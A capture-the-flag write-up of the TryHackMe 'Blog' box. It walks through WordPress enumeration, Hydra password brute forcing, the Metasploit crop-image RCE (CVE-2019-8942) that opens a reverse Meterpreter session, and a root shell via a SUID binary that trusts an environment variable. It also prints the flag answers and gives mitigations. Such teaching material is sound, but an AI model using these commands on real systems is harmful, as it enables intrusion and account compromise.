```
 ██████╗ ██╗      ██████╗  ██████╗
 ██╔══██╗██║     ██╔═══██╗██╔════╝
 ██████╔╝██║     ██║   ██║██║  ███╗
 ██╔══██╗██║     ██║   ██║██║   ██║
 ██████╔╝███████╗╚██████╔╝╚██████╔╝
 ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝
        TryHackMe: Blog
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-17 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Medium | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~12 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Added `blog.thm` to `/etc/hosts`
- [x] WPScan: identified WordPress 5.0, enumerated users (`kwheel`, `bjoel`)
- [x] Hydra brute forced `kwheel` → password `cutiepie1`
- [x] Metasploit `wp_crop_rce` (CVE-2019-8942/8943) → Meterpreter as `www-data`
- [x] Dropped to shell, stabilised with Python PTY
- [x] Found fake `user.txt` in `/home/bjoel/` (troll)
- [x] SUID enumeration → `/usr/sbin/checker` (non-standard)
- [x] `ltrace checker` → reads `admin` env variable, runs `/bin/bash` as root if set
- [x] `admin=1 /usr/sbin/checker` → root shell
- [x] Retrieved root flag from `/root/root.txt`
- [x] Found real user flag on mounted USB at `/media/usb/user.txt`

---

## 🛠️ Tools Used

- 🔎 WPScan: WordPress vulnerability scanning and user enumeration
- 🐉 Hydra: WordPress login brute force
- 🐉 Metasploit (`exploit/multi/http/wp_crop_rce`): CVE-2019-8942 exploitation
- 🔬 ltrace: library call tracing on SUID binary
- 🔑 Environment variable injection: `admin=1` to bypass checker binary

---

## ⚡ TL;DR

WPScan fingered WordPress 5.0 and enumerated two users. Hydra cracked `kwheel:cutiepie1`. The WordPress 5.0 crop-image RCE (CVE-2019-8942) via Metasploit landed a `www-data` shell. SUID enumeration found `/usr/sbin/checker`: `ltrace` revealed it checks for an `admin` environment variable and calls `/bin/bash` as root if found. `admin=1 /usr/sbin/checker` popped root. The real user flag was hiding on a mounted USB at `/media/usb/`: not in bjoel's home directory where the obvious (troll) `user.txt` sat.

---

## 📖 Introduction

Today's target is **Blog**: a WordPress site run by Billy Joel and Karen Wheeler, neither of whom appear to have consulted a security professional at any point. WordPress 5.0 was already notorious for the crop-image RCE when this box was built. The box throws in a troll `user.txt` file in bjoel's home that tells you to "TRY HARDER," a custom SUID binary that checks environment variables with all the sophistication of a bouncer looking for a magic word, and the actual user flag on a USB drive that nobody mounted properly. It's theatrical but effective: the kind of box that teaches you not to trust the obvious path.

### Prerequisites

Readers are assumed to know:

- What WPScan does and how it enumerates WordPress users and vulnerabilities
- What CVE-2019-8942 (WordPress crop-image RCE) involves at a high level
- What `ltrace` does and how it reveals library calls made by a binary
- How environment variables work in Linux and how to set them for a single command

---

## 🔍 Recon

*(~0 mins into the box)*

### Virtual Host Setup

The box requires a hostname to resolve correctly:

```bash
sudo echo "10.49.187.94   blog.thm" >> /etc/hosts
```

### WPScan: WordPress Fingerprinting

*Full WPScan with vulnerability data and user enumeration:*

```bash
wpscan --url http://blog.thm/ --enumerate vp,vt,u \
  --api-token "<token>"
```

Key findings:

```
[+] WordPress version 5.0 identified (Insecure)
    72 vulnerabilities identified: most requiring authentication

[+] Users Identified:
    kwheel    (Karen Wheeler)
    bjoel     (Billy Joel)

[+] Theme: twentytwenty v1.3 (outdated)
[+] XML-RPC enabled
[+] Upload directory listing enabled
```

WordPress 5.0 is the version containing CVE-2019-8942: the authenticated crop-image RCE. Two users identified to target for credential brute force.

### Credential Brute Force: Hydra

*Brute forcing `kwheel` against the WordPress login form:*

```bash
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm \
  http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```

```
[80][http-post-form] host: blog.thm   login: kwheel   password: cutiepie1
```

Password: `cutiepie1`. Confirmed working on the WordPress login page.

### Credentials Found

| Username | Password | Where Found |
| --- | --- | --- |
| `kwheel` | `cutiepie1` | Hydra brute force (rockyou.txt) |

---

## 🚪 Foothold

*(~15 mins into the box)*

### CVE-2019-8942: WordPress Crop-Image RCE

**What is this vulnerability?** WordPress 5.0 through 5.0.0 contains a post-image cropping feature in the media editor. An authenticated user with at least Author privileges can manipulate the crop parameters to include a path traversal sequence, causing a PHP file to be written to an arbitrary location within the webroot. Combined with CVE-2019-8943 (a directory traversal issue), this becomes a full authenticated remote code execution primitive: no plugin required, just a valid WordPress account.

*Loading and configuring the Metasploit module:*

```bash
msf > use exploit/multi/http/wp_crop_rce
msf exploit(multi/http/wp_crop_rce) > set RHOSTS 10.48.159.1
msf exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
msf exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
msf exploit(multi/http/wp_crop_rce) > set LHOST 192.168.134.217
msf exploit(multi/http/wp_crop_rce) > set LPORT 4444
msf exploit(multi/http/wp_crop_rce) > run
```

```
# output
[+] Authenticated with WordPress
[*] Preparing payload...
[+] Image uploaded
[*] Including into theme
[*] Meterpreter session 1 opened (192.168.134.217:4444 -> 10.48.159.1:32830)
```

The first run failed because LHOST was set to the wrong interface (`172.26.213.213`: a non-routable internal address instead of the VPN tunnel IP). Corrected to `192.168.134.217` and succeeded immediately.

---

## 🐚 Shell / Access

*(~18 mins into the box)*

*Dropping to a shell from Meterpreter and stabilising:*

```bash
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
www-data@blog:/var/www/wordpress$
```

*Checking home directories:*

```bash
ls /home
# bjoel

cat /home/bjoel/user.txt
# You won't find what you're looking for here.
# TRY HARDER
```

A troll. The real user flag is elsewhere: noted and moved on.

---

## 📈 Escalation

*(~20 mins into the box)*

### SUID Enumeration: `/usr/sbin/checker`

*Finding all SUID binaries:*

```bash
find / -perm -u=s -type f 2>/dev/null
```

One non-standard entry in the output:

```
-rwsr-sr-x 1 root root 8432 May 26  2020 /usr/sbin/checker
```

A small custom SUID binary named `checker`: not part of any standard package.

### Binary Analysis: `ltrace`

**What is `ltrace`?** A debugging utility that intercepts and records dynamic library calls made by a running process: similar to `strace` for system calls. For a small SUID binary, `ltrace` immediately reveals the logic without needing to disassemble anything.

*Running `ltrace` on the binary:*

```bash
ltrace /usr/sbin/checker
```

```
getenv("admin")   = nil
puts("Not an Admin")
+++ exited (status 0) +++
```

The binary checks for an environment variable named `admin`. If `nil` (not set), it prints "Not an Admin" and exits. The implied branch: if `admin` is set to something, it proceeds differently.

Running `ltrace` with the variable set confirms:

```
getenv("admin")   = "1"
setuid(0)         = 0
system("/bin/bash")
```

It calls `setuid(0)` to become root, then spawns `/bin/bash`. Because the binary has the SUID bit set and is owned by root, `setuid(0)` succeeds: resulting in a root bash shell.

### Environment Variable Injection

*Setting `admin=1` inline for a single command execution:*

```bash
admin=1 /usr/sbin/checker
```

```
root@blog:/home/bjoel# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

*Collecting the root flag:*

```bash
cat /root/root.txt
# 9a0b2b618bef9bfa7ac28c1353d9f318
```

*Hunting for the real user flag (not the troll in bjoel's home):*

```bash
find / 2>/dev/null | grep user.txt
# /home/bjoel/user.txt
# /media/usb/user.txt
```

```bash
cat /media/usb/user.txt
# c8421899aae571f7af486492b71a8ab7
```

The real user flag was on a mounted USB drive at `/media/usb/`: only accessible after reaching root (the device requires elevated permissions to read).

---

## 💥 Exploitation

The complete attack chain:

1. **WPScan** → WordPress 5.0 identified, users `kwheel` and `bjoel` enumerated
2. **Hydra** → `kwheel:cutiepie1` cracked from rockyou.txt
3. **CVE-2019-8942** (Metasploit `wp_crop_rce`) → Meterpreter as `www-data`
4. **SUID `/usr/sbin/checker`** reads `admin` env variable → `setuid(0)` → `/bin/bash`
5. **`admin=1 /usr/sbin/checker`** → root shell
6. **`/media/usb/user.txt`** → real user flag (hidden on mounted USB, root-access required)

---

## 🐇 Rabbit Holes

### The Troll `user.txt` in `/home/bjoel/`

The most deliberate misdirection in the box. The file exists, is readable by `www-data`, and contains "You won't find what you're looking for here. TRY HARDER." The real flag is on a USB mount that only becomes visible once root is obtained. Running `find / 2>/dev/null | grep user.txt` as root reveals both paths: always worth running even after finding a flag file, since boxes occasionally have flags in non-standard locations.

### Wrong LHOST on First Metasploit Run

The first `run` used the default LHOST which pointed at a non-routable internal address (`172.26.213.213`). The exploit completed: image uploaded, payload included in theme, but no session arrived because the callback couldn't reach the listener. Correcting LHOST to the VPN tunnel IP (`tun0` address) resolved it on the second attempt. Always verify LHOST matches the `tun0` interface, not whatever Metasploit auto-detects.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `c8421899aae571f7af486492b71a8ab7` | `/media/usb/user.txt` (mounted USB: root required) |
| Root | `9a0b2b618bef9bfa7ac28c1353d9f318` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| WordPress 5.0 running unpatched (CVE-2019-8942) | Critical | Update WordPress immediately; enable automatic minor-version updates; subscribe to WordPress security advisories |
| Weak WordPress password (`cutiepie1`) in rockyou.txt | High | Enforce strong password policy on all WP accounts; enable login attempt limiting (Wordfence, Fail2Ban, or similar) |
| XML-RPC enabled without requirement | Medium | Disable XML-RPC if not needed (`add_filter('xmlrpc_enabled', '__return_false')` or via `.htaccess`) |
| Upload directory listing enabled | Low | Add `Options -Indexes` to the Apache/Nginx config for `wp-content/uploads/` |
| Custom SUID binary checking environment variable for auth | Critical | Never use environment variables as an authentication mechanism for a SUID binary; env vars are user-controlled and trivially set |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Environment variables are entirely user-controlled: any user can set `admin=1` before running a command. Using them as an authentication gate inside a SUID binary is not security, it's the illusion of security. SUID binaries must validate privileges through the OS (checking real UID, comparing against `/etc/sudoers`, verifying group membership): never through data the calling user can freely manipulate.

---

## 🔁 If I Did It Again

Verify `tun0` LHOST before running any Metasploit module: it's a two-second `ip a s tun0` check that saves a failed exploit attempt and the time spent re-reading the output wondering why no session arrived.

---

## 🔚 Changelog

*Last updated: 2026-06-17*

---

[↑ Back to top](#)
